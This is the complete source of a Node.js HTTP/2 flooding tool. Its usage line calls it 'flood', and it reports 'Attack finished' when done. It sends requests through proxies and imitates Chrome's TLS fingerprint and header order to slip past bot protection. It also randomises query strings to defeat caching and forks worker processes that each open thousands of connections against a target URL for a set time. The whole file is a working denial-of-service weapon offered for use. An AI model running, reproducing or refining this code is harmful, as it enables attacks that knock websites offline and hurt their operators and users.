// script recode by nm301 // @nminh0001
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

// Parse arguments
const target = process.argv[2];
const time = parseInt(process.argv[3]);
const threads = parseInt(process.argv[4]);
const ratelimit = parseInt(process.argv[5]);
const proxyStr = process.argv[6];
const cookie = process.argv[7] || '';
const userAgent = process.argv[8] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36';
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const debugMode = process.argv.includes('--debug');
const cacheMode = process.argv.includes('--cache');

const [proxyHost, proxyPortStr] = proxyStr ? proxyStr.split(':') : ['', ''];
const proxyPort = proxyPortStr ? parseInt(proxyPortStr) : 0;

// Early validation
if (!target || !time || !threads || !ratelimit || !proxyStr || !proxyHost || isNaN(proxyPort)) {
    console.clear();
    console.error(`
    node flood <target> <time> <threads> <ratelimit> <proxy ip:port> <cookie> <ua> <options>

    options: (--query (1/2/3) / --delay (1-1000) / --debug / --cache)
    `);
    process.exit(1);
}

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => { return 1; })
    .on("SIGCHILD", () => { return 1; });

const statusesQ = [];
let statuses = {};
let custom_table = 16384;
let custom_window = 65535;
let custom_header = 4096;
let custom_update = 65535;
let maxConcurrent = 100;
let windowSize = 65535;
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const badProxies = new Set();
const url = new URL(target);

function parseUA(ua) {
    const versionMatch = ua.match(/Chrome\/([\d.]+)/);
    const fullVersion = versionMatch ? versionMatch[1] : '141.0.0.0';
    const majorVersion = fullVersion.split('.')[0];
    const platformMatch = ua.match(/\(([^;)]+)/);
    const platformStr = platformMatch ? platformMatch[1] : 'Windows NT 10.0; Win64; x64';
    let secChUaPlatform, secChUaMobile, secChUaArch, secChUaBitness, secChUaPlatformVersion;
    if (platformStr.includes('Windows')) {
        secChUaPlatform = '"Windows"';
        secChUaMobile = '?0';
        secChUaArch = '"x86"';
        secChUaBitness = '"64"';
        secChUaPlatformVersion = '"10.0.0"';
    } else {
        secChUaPlatform = '"Windows"';
        secChUaMobile = '?0';
        secChUaArch = '"x86"';
        secChUaBitness = '"64"';
        secChUaPlatformVersion = '"10.0.0"';
    }
    const secChUa = `"Chromium";v="${fullVersion}", "Not=A?Brand";v="8", "Google Chrome";v="${fullVersion}"`;
    return { secChUa, secChUaPlatform, secChUaMobile, secChUaArch, secChUaBitness, secChUaPlatformVersion };
}

const uaParsed = parseUA(userAgent);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let payloadLength = Buffer.isBuffer(payload) ? payload.length : Buffer.byteLength(payload);
    if (payloadLength > custom_table) {
        payloadLength = custom_table;
        payload = Buffer.isBuffer(payload) ? payload.slice(0, custom_table) : Buffer.from(payload).slice(0, custom_table);
    }
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payloadLength << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    if (payloadLength > 0) {
        const payloadBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(payload);
        frame = Buffer.concat([frame, payloadBuffer]);
    }
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    let payloadStart = 9;
    let actualPayloadLen = length;
    if (flags & 0x20) { // PADDED
        if (data.length < 10) return null;
        const padLen = data.readUInt8(9);
        payloadStart = 10;
        actualPayloadLen -= (1 + padLen);
        if (actualPayloadLen < 0) return null;
    }
    if (flags & 0x10) { // PRIORITY
        payloadStart += 5;
        actualPayloadLen -= 5;
        if (actualPayloadLen < 0) return null;
    }
    const totalFrameLen = 9 + length;
    if (data.length < totalFrameLen) return null;
    let payload = Buffer.alloc(0);
    if (actualPayloadLen > 0) {
        if (payloadStart + actualPayloadLen > data.length) return null;
        payload = data.subarray(payloadStart, payloadStart + actualPayloadLen);
    }
    return { streamId, length, type, flags, payload };
}

function parseSettings(payload) {
    const settings = {};
    for (let i = 0; i < payload.length; i += 6) {
        const id = payload.readUInt16BE(i);
        const value = payload.readUInt32BE(i + 2);
        settings[id] = value;
    }
    return settings;
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function createConnectionWithRetry(proxyHost, proxyPort, retryCount = 0) {
    return new Promise((resolve, reject) => {
        const proxyKey = `${proxyHost}:${proxyPort}`;
        if (badProxies.has(proxyKey)) {
            reject(new Error('Bad proxy, skipped'));
            return;
        }
        if (retryCount >= 3) {
            badProxies.add(proxyKey);
            reject(new Error('Max retries exceeded'));
            return;
        }
        const netSocket = net.connect(proxyPort, proxyHost);
        const connectionTimeout = setTimeout(() => {
            netSocket.destroy();
            badProxies.add(proxyKey);
            setTimeout(() => {
                createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                    .then(resolve)
                    .catch(reject);
            }, 1000 * Math.pow(2, retryCount));
        }, 10000);
        netSocket.on('connect', () => {
            clearTimeout(connectionTimeout);
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384',
                    groups: 'X25519:P-256:P-384',
                    secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
                    secure: true,
                    minVersion: 'TLSv1.3',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false,
                });
                const tlsTimeout = setTimeout(() => {
                    tlsSocket.destroy();
                    badProxies.add(proxyKey);
                    setTimeout(() => {
                        createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                            .then(resolve)
                            .catch(reject);
                    }, 1000 * Math.pow(2, retryCount));
                }, 8000);
                tlsSocket.on('secureConnect', () => {
                    clearTimeout(tlsTimeout);
                    resolve({ tlsSocket });
                });
                tlsSocket.on('error', (err) => {
                    clearTimeout(tlsTimeout);
                    badProxies.add(proxyKey);
                    setTimeout(() => {
                        createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                            .then(resolve)
                            .catch(reject);
                    }, 1000 * Math.pow(2, retryCount));
                });
            });
            const connectReq = `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\nUser-Agent: ${userAgent}\r\n\r\n`;
            netSocket.write(connectReq);
        });
        netSocket.on('error', (err) => {
            clearTimeout(connectionTimeout);
            badProxies.add(proxyKey);
            setTimeout(() => {
                createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                    .then(resolve)
                    .catch(reject);
            }, 1000 * Math.pow(2, retryCount));
        });
    });
}

async function go() {
    const proxyKey = `${proxyHost}:${proxyPort}`;
    if (badProxies.has(proxyKey)) {
        setTimeout(go, 1000);
        return;
    }
    if (!proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 10);
        return;
    }
    try {
        const { tlsSocket } = await createConnectionWithRetry(proxyHost, proxyPort);
        let streamId = 1;
        let data = Buffer.alloc(0);
        let hpack = new HPACK();
        hpack.setTableSize(custom_header);
        let activeStreams = 0;
        const languages = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8",
            "fr-FR,fr;q=0.9,en;q=0.8",
        ];
        const randomLanguage = languages[Math.floor(Math.random() * languages.length)];
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(custom_update, 0);
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([
                [1, custom_window],
                [2, 1],
                [3, maxConcurrent],
                [4, custom_window],
                [5, custom_table]
            ])),
            encodeFrame(0, 8, updateWindow)
        ];
        tlsSocket.on('data', (eventData) => {
            data = Buffer.concat([data, eventData]);
            while (data.length >= 9) {
                try {
                    const frame = decodeFrame(data);
                    if (frame != null) {
                        data = data.subarray(9 + frame.length);
                        if (frame.type === 4) { // SETTINGS
                            if (frame.flags === 0) {
                                const settings = parseSettings(frame.payload);
                                if (settings[1]) custom_header = settings[1];
                                if (settings[4]) custom_window = settings[4];
                                if (settings[5]) custom_table = settings[5];
                                if (settings[6]) maxConcurrent = settings[6];
                                hpack.setTableSize(custom_header);
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                        } else if (frame.type === 8) { // WINDOW_UPDATE
                            const increment = frame.payload.readUInt32BE(0);
                            windowSize += increment;
                        } else if (frame.type === 1) { // HEADERS
                            try {
                                const decodedHeaders = hpack.decode(frame.payload);
                                const statusHeader = decodedHeaders.find(x => x[0] == ':status');
                                if (statusHeader && debugMode) {
                                    const status = statusHeader[1];
                                    if (!statuses[status]) statuses[status] = 0;
                                    statuses[status]++;
                                }
                            } catch (e) {}
                        } else if (frame.type === 7) { // GOAWAY
                            if (debugMode) {
                                if (!statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                                statuses["GOAWAY"]++;
                            }
                            tlsSocket.end(() => {
                                tlsSocket.destroy();
                            });
                            return;
                        } else if (frame.type === 3) { // RST_STREAM
                            activeStreams = Math.max(0, activeStreams - 1);
                        }
                    } else {
                        break;
                    }
                } catch (e) {
                    break;
                }
            }
        });
        tlsSocket.on('close', () => {
            setTimeout(go, 10);
        });
        tlsSocket.on('error', (err) => {
            tlsSocket.destroy();
            setTimeout(go, 100);
        });
        tlsSocket.write(Buffer.concat(frames));
        setInterval(() => {
            if (!tlsSocket.destroyed) {
                tlsSocket.write(encodeFrame(0, 6, crypto.randomBytes(8), 0));
            }
        }, 30000 + Math.random() * 10000);
        function doWrite() {
            if (tlsSocket.destroyed || activeStreams >= maxConcurrent || windowSize <= 0) {
                setTimeout(doWrite, 100);
                return;
            }
            function handleQuery(query) {
                if (query === '1') {
                    return url.pathname + '?t=' + randstrr(10) + '=' + randstrr(15);
                } else if (query === '2') {
                    return url.pathname + '?' + generateRandomString(6, 8) + '=' + generateRandomString(6, 8);
                } else if (query === '3') {
                    return url.pathname + '?q=' + generateRandomString(6, 8) + '&' + generateRandomString(6, 8) + '=' + generateRandomString(4, 8);
                } else {
                    return url.pathname;
                }
            }
            const requests = [];
            let pathValue = query ? handleQuery(query) : url.pathname;

            if (cacheMode) {
                const cacheBust = Date.now().toString().slice(-6);
                pathValue += pathValue.includes('?') ? `&cachebust=${cacheBust}` : `?cachebust=${cacheBust}`;
            }

            // Headers theo đúng thứ tự browser thực tế (cập nhật để giống Chrome hơn)
            const headersArray = [
                // Pseudo headers (luôn đầu tiên)
                [":method", "GET"],
                [":authority", url.hostname],
                [":scheme", "https"],
                [":path", pathValue],
                ["cache-control", "max-age=0"],
                ["sec-ch-ua", uaParsed.secChUa],
                ["sec-ch-ua-mobile", "?0"],
                ["sec-ch-ua-platform", '"Windows"'],
                ["upgrade-insecure-requests", "1"],
                ["user-agent", userAgent],
                ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
                ["sec-fetch-site", "none"],
                ["sec-fetch-mode", "navigate"],
                ["sec-fetch-user", "?1"],
                ["sec-fetch-dest", "document"],
                ["accept-encoding", "gzip, deflate, br, zstd"],
                ["accept-language", randomLanguage],
                ["priority", "u=0, i"],
                ["cookie", cookie]
            ];

            const encodedHeaders = hpack.encode(headersArray);
            if (streamId >= 0x7FFFFFFF) streamId = 1;
            requests.push(encodeFrame(streamId, 1, encodedHeaders, 0x5));
            streamId += 2;
            activeStreams++;
            windowSize -= encodedHeaders.length;
            tlsSocket.write(Buffer.concat(requests), (err) => {
                if (!err && !tlsSocket.destroyed) {
                    const baseDelay = 1000 / ratelimit;
                    const jitter = Math.random() * baseDelay * 0.3;
                    const randomDelay = baseDelay + jitter - (baseDelay * 0.15);
                    setTimeout(doWrite, randomDelay);
                } else {
                    activeStreams = Math.max(0, activeStreams - 1);
                }
            });
        }
        doWrite();
    } catch (err) {
        setTimeout(go, 1000);
    }
}

if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    cluster.on('exit', (worker) => {
        delete workers[worker.id];
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });
   if (debugMode) {
    let previousLineLength = 0;
    setInterval(() => {
        let statuses = {};
        for (let w in workers) {
            if (workers[w] && workers[w][0].state == 'online' && workers[w][1]) {
                for (let st of workers[w][1]) {
                    for (let code in st) {
                        if (statuses[code] == null) statuses[code] = 0;
                        statuses[code] += st[code];
                    }
                }
            }
        }
        const line = `${JSON.stringify(statuses)}`;
        const padding = ' '.repeat(Math.max(0, previousLineLength - line.length));
        process.stdout.write(`\r${line}${padding}`);
        previousLineLength = line.length;
    }, 1000);
}
    process.on('SIGINT', () => {
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    setTimeout(() => {
        console.log('Attack finished');
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, time * 1000);
} else {
    let conns = 0;
    const maxConns = 4000;
    let i = setInterval(() => {
        if (conns >= maxConns) return;
        conns++;
        go();
    }, delay || 10);
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 1000);
    }
    setTimeout(() => {
        process.exit(0);
    }, time * 1000);
}